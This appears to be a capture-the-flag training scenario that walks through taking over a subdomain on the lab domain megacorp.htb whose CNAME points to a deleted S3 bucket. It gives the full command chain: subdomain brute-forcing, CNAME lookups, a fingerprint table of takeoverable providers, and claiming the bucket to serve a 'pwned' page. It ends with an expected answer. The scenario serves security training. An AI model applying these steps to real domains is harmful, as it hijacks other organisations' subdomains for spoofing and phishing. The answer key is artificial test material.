# Scenario 30 — Subdomain takeover via dangling cloud CNAME

**Difficulty:** 🔴 | **Time:** ~30 min | **Domains:** 01, 13, 14
**Tools:** [dig](../../tools/dig.md), [dnsrecon](../../tools/dnsrecon.md), `curl`

## Story
Company `megacorp.htb` has orphaned DNS records pointing at deprovisioned cloud resources. Identify one, claim it, and prove ownership by serving a file that the scoring engine fetches.

## Step 1 — Enumerate subdomains
```bash
dnsrecon -d megacorp.htb -D /usr/share/wordlists/subdomains-top1million-5000.txt -t brt
# or
gobuster dns -d megacorp.htb -w subdomains.txt
```
**Expected finding:** `blog.megacorp.htb`, `shop.megacorp.htb`, `legacy.megacorp.htb`.

## Step 2 — Check CNAME targets
```bash
for s in blog shop legacy; do
  dig +short CNAME $s.megacorp.htb
done
```
**Expected finding:**
```
legacy.megacorp.htb.  →  megacorp-legacy.s3.amazonaws.com.
shop.megacorp.htb.    →  megacorp.github.io.
```

## Step 3 — Probe for dangling response
```bash
curl -I http://legacy.megacorp.htb/
```
**Expected finding:** HTTP 404 with body:
```
NoSuchBucket: The specified bucket does not exist
```
**Interpretation:** S3 bucket was deleted but DNS still points to it → takeover candidate.

## Step 4 — Cross-reference fingerprints (can-i-take-over-xyz)
| Provider | Fingerprint | Takeover? |
|---|---|---|
| AWS S3 | `NoSuchBucket` | Yes |
| GitHub Pages | `There isn't a GitHub Pages site here.` | Yes |
| Heroku | `No such app` | Yes |
| Azure | `404 Web Site not found` | Yes (varies) |

## Step 5 — Claim the resource
```bash
# create bucket with the exact orphaned name:
aws s3api create-bucket --bucket megacorp-legacy --region us-east-1
aws s3 website s3://megacorp-legacy --index-document index.html
echo "<html>pwned by $(whoami)</html>" > index.html
aws s3 cp index.html s3://megacorp-legacy/ --acl public-read
```

## Step 6 — Verify
```bash
curl http://legacy.megacorp.htb/
```
**Expected finding:** your HTML served under the victim's subdomain.

## Step 7 — Final answer
**Answer format:** the takeoverable subdomain name (e.g. `legacy.megacorp.htb`) or the cloud provider.

## Gotchas across this chain
- Bucket names are globally unique across all AWS — if someone else registered it you can't claim it.
- GitHub Pages requires you to create a repo with the exact CNAME config and verify.
- Some providers (Cloudflare, Fastly) returned `NXDOMAIN`-looking errors that are NOT takeoverable — check `can-i-take-over-xyz` first.
- Wildcard CNAMEs (`*.megacorp.htb`) can mask individual dangling records.

## Variant questions this scenario teaches
- "Which subdomain is vulnerable to takeover?"
- "What cloud provider hosts the dangling resource?"
- "What HTTP error indicates an unclaimed S3 bucket?" → NoSuchBucket

